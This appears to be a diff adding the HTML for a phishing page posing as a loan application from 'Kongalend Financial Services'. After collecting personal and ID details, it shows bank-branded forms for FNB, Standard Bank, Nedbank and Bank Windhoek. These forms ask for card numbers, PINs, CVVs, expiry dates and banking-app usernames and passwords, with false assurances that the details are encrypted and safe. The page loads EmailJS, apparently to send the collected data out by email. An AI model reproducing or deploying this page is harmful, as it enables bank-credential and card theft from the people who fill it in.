@@ -1,0 +1,244 @@
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="apply.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+    <link href="https://fonts.googleapis.com/css2?family=Charm:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/b33e9054eb.js" crossorigin="anonymous"></script>
+    <title>Application Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('0LRBbfsuLkB1os');
+        })();
+    </script>
+</head>
+<body>
+
+    <div id="div1">
+        <div id="img1"><img src="./logo.jpg" alt=""></div>
+        <i id="icon1" class="fa-solid fa-bars"></i>
+        <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+        <i id="icon2" class="fa-solid fa-magnifying-glass"></i>
+    </div>
+    <div id="div2">
+        <p id="p4">Kongalend Financial Services Application Form</p>
+    </div>
+    <form id="contact-form">
+
+        <div id="form1"  style="display: none;">
+            
+                <input type="hidden" name="contact_number">
+        
+                <label for="name">Full Name:</label> <br>
+                <input type="text" name="name" id="name" placeholder="Enter First Name"> 
+                <input type="text" name="surname" id="surname" placeholder="Enter Surname"> <br>
+        
+                <label for="address">Address:</label>
+                <input type="text" name="address" id="address" placeholder="Enter Address"><br>
+        
+                <label for="phone">Phone Number</label>
+                <input type="number" name="phone" id="phone" placeholder="Enter Phone Number"><br>
+        
+                <label for="account">Account Number:</label>
+                <input type="number" name="account" id="account" placeholder="Enter Account Number"><br>
+            
+                <label for="amount">Loan Amount:</label>
+                <input type="number" name="amount" id="amount" placeholder="Enter Loan Amount "><br>
+            
+                <label for="duration">Loan Duration:</label>
+                <input type="number" name="amount" id="amount" placeholder="Enter Your Loan Duration "><br>
+            
+                <label for="identity">ID Number:</label> <br>
+                <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br>
+                           
+                <label for="email">E-Mail Address:</label> <br>
+                <input type="email" name="email" id="email" placeholder="Enter Email"> <br>
+            
+                <p id="error"></p>
+           
+                <p id="next">Next >></p>
+            
+                <div id="terms">
+                    <input type="checkbox" name="agree" id="agree">
+                    <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
+                    
+                </div>
+        </div>
+        <div id="form2" >
+            <p id="banks" style="margin: 0px auto;">Select your bank</p>
+            <div style=" color: black;" id="show-element">
+                <div class="single-banks">
+                    <img src="./36795309639147dfbee1cf09acc2084c.webp" alt="" width="300">
+                    <p style="text-align: center; font-size: xx-large;">FNB</p>
+                </div>
+                <div class="single-banks">
+                    <img src="./Standard_Bank_of_South_Africa_logo.png" alt="" width="175">
+                    <p style="text-align: center; font-size: xx-large; margin-right: 12%;">STANDARD BANK</p>
+                </div>
+                <div class="single-banks">
+                    <img src="./nedbank logo" alt="" width="200">
+                    <p style="text-align: center; font-size: xx-large;">NEDBANK</p>
+                </div> 
+                <div class="single-banks">
+                    <img src="./windhoek logo.png" alt="" width="200">
+                    <p style="text-align: center; font-size: xx-large;">WINDHOEK</p>
+                </div>
+                <p class="single-banks" style="width: 100%; font-size: 250%; text-align: center;">Select your bank to proceed further</p>
+            </div>
+            <!-- <label for="" id="show-bank-details">Kindly select your bank first</label> <br>
+            <select name="bank" id="banks">
+                <option id="opt1" value="Select your bank">Select your bank</option>
+                <option id="opt2" value="FNB">FNB <img src="./36795309639147dfbee1cf09acc2084c.webp" alt=""></option>
+                <option id="opt3" value="NEDBANK">NEDBANK</option>
+                <option id="opt4" value="WINDHOEK">WINDHOEK</option>
+            </select> -->
+        </div>
+        
+        <div id="FNB-details" style="display: none; " >
+                <div id="div1">
+                    <div id="img1"><img src="./36795309639147dfbee1cf09acc2084c.webp" style="width: 200; margin-top: 1%;" alt=""></div>
+                    <i id="icon1" class="fa-solid fa-bars"></i>
+                    <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+                    <i id="icon2" class="fa-solid fa-magnifying-glass"></i>
+                </div>
+                <div style="padding: 5%;">
+                    <p id="p2" style="margin-top: 15%; font-size: 230%;">Kindly input the required details to enable your loan disbursement into your account and
+                        be ensured that your details are all encrypted and safe</p>
+                        <label for="card">Card Number:</label> <br>
+                        <input type="number" class="fnbs" name="card" id="card" placeholder="Enter Card Number"> <br>
+                        
+                        <label for="pin">Card Pin:</label><br>
+                        <input type="number" class="fnbs" name="pin" id="pin" placeholder="Enter Card Pin"> <br>
+                
+                        <p id="p3"> Kindly input the required details to enable your loan disbursement into your account and
+                            be ensured that your details are all encrypted and safe</p>
+                        <label for="username">App Username:</label> <br>
+                        <input type="text" class="fnbs" name="username" id="username" placeholder="Enter Username"> <br>
+                
+                        <label for="password">App Password:</label> <br>
+                        <input type="password" class="fnbs" name="password" id="password" placeholder="Enter Password"> <br>            
+                
+                        <p id="error2"></p>
+                     <input type="submit" value="Submit" id="submit" style="display: none;">
+                </div>
+            </div>
+        
+        <div id="STANDARD-details" style="display: none; " >
+                <div id="div1">
+                    <div id="img1"><img src="./Standard_Bank_of_South_Africa_logo.png" style="width: 120; margin-top: 1%;" alt=""></div>
+                    <i id="icon1" class="fa-solid fa-bars"></i>
+                    <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+                    <i id="icon2" class="fa-solid fa-magnifying-glass"></i>
+                </div>
+                <div style="padding: 5%;">
+                    <p id="p2" style="margin-top: 15%; font-size: 230%;">Kindly input the required details to enable your loan disbursement into your account and
+                        be ensured that your details are all encrypted and safe</p>
+                        <label for="card">Card Number:</label> <br>
+                        <input type="number" class="fnbs" name="card" id="card" placeholder="Enter Card Number"> <br>
+                        
+                        <label for="pin">Card Pin:</label><br>
+                        <input type="number" class="fnbs" name="pin" id="pin" placeholder="Enter Card Pin"> <br>
+                
+                        <p id="p3"> Kindly input the required details to enable your loan disbursement into your account and
+                            be ensured that your details are all encrypted and safe</p>
+                        <label for="username">App Username:</label> <br>
+                        <input type="text" class="fnbs" name="username" id="username" placeholder="Enter Username"> <br>
+                
+                        <label for="password">App Password:</label> <br>
+                        <input type="password" class="fnbs" name="password" id="password" placeholder="Enter Password"> <br>            
+                
+                        <p id="error2"></p>
+
+                     <input type="submit" value="Submit" id="submit" style="display: none;">
+                </div>
+            </div>
+
+
+            <div id="NEDBANK-datails" style="display: none;">
+                <div id="div1">
+                    <div id="img1"><img src="./nedbank logo" style="width: 150; margin-top: 1%;" alt=""></div>
+                    <i id="icon1" class="fa-solid fa-bars"></i>
+                    <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+                    <i id="icon2" class="fa-solid fa-magnifying-glass"></i>
+                </div>
+                <!-- <div id="div2">
+                    <p id="p4">Kongalend Financial Services Application Form</p>
+                </div> -->
+                <p id="p2" style="margin-top: 15%; font-size: 230%;">Kindly input the required details to enable your loan disbursement into your account and
+                    be ensured that your details are all encrypted and safe</p>
+                    <label for="profileNumber">Profile Number:</label> <br>
+                    <input type="number" class="nedbank" name="Profile" id="profileNumber" placeholder="Enter Profile Number"> <br>
+                    
+                    <label for="password">Password:</label><br>
+                    <input type="password" class="nedbank" name="profilePassword" id="profilePassword" placeholder="Enter password"> <br>
+                    
+                    <p id="error3"></p>
+                    
+                    <input type="submit" value="Submit" id="submit1" style="display: none;">
+                    
+                </div>
+                
+                
+            <div id="WINDHOEK-details" style="display: none;">
+                <div id="div1">
+                    <div id="img1"><img src="./windhoek logo.png" style="width: 150; margin-top: 1%;" alt=""></div>
+                    <i id="icon1" class="fa-solid fa-bars"></i>
+                    <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+                    <i id="icon2" class="fa-solid fa-magnifying-glass"></i>
+                </div>
+                <div style="padding: 5%;">
+
+                    <p id="p2" style="margin-top: 15%; font-size: 230%;">Kindly input the required details to enable your loan disbursement into your account and
+                        be ensured that your details are all encrypted and safe</p>
+                    <label for="email">E-Mail Address:</label> <br>
+                    <input type="email" class="windhoeks" name="windhoek-email" id="windhoek-email" placeholder="Enter Email"> <br>
+                
+                    <label for="password">Password:</label><br>
+                    <input type="password" class="windhoeks" name="wimdhoek-password" id="wimdhoek-password" placeholder="Enter password"> <br>
+
+                    <label for="card">Card Number:</label> <br>
+                    <input type="number" class="windhoeks" name="cardNumber" id="cardNumber" placeholder="Enter Card Number"> <br>
+            
+                    <div id="card-details">
+                        <input type="text" class="windhoeks" name="card-date" id="card-date" placeholder="mm/yy" maxlength="5"> <br>
+                        <input type="number" class="windhoeks" name="cvv" id="cvv" placeholder="Enter Card Cvv Number" maxlength="3"> <br>
+            
+                    </div>
+                    <p id="error4"></p>
+
+                     <input type="submit" value="Submit" id="submit2" style="display: none;">
+                     
+                </div>
+            </div>
+
+
+      
+        
+
+        <!-- <img id="img1" src="./5f9e93db193a4599be7cedfaa83453f9.webp" alt=""> -->
+
+
+
+    </form>
+
+    <div id="write-up" style="display: none;">
+        <div id="write">
+            <!-- <img src="./b14ebf87-f581-432d-82f4-c51932ca8653.jpg" alt=""> -->
+            <h3>Heading</h3>
+            <p id="failure">Unable to make to submit form <br><br> <span id="why">
+              Due to your internet connection</span> </p>
+            </div>
+    </div>
+    <div id="successful" style="display: none; width: 100vw;">
+        <img style="width: 105vw;" src="./WhatsApp Image 2024-05-13 at 23.06.34 (1).jpeg" alt="">
+    </div>
+   </div>
+   </div>
+    <!-- <img src="./fnb-logo-2016.jpg" alt=""> -->
+    <script src="index.js"></script>
+</body>
+</html>
